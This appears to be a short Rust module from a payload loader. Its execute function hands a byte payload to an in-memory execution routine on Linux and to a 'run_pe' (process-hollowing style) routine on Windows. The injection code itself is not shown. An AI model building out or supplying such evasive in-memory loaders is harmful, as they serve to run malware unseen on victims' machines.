#[cfg(target_os = "linux")]
pub mod linux;
#[cfg(target_os = "windows")]
pub mod windows;

pub fn execute(payload: Vec<u8>) {
    #[cfg(target_os = "linux")]
    linux::linux_mem_exec(payload);

    #[cfg(target_os = "windows")]
    unsafe { windows::run_pe(payload); }
}
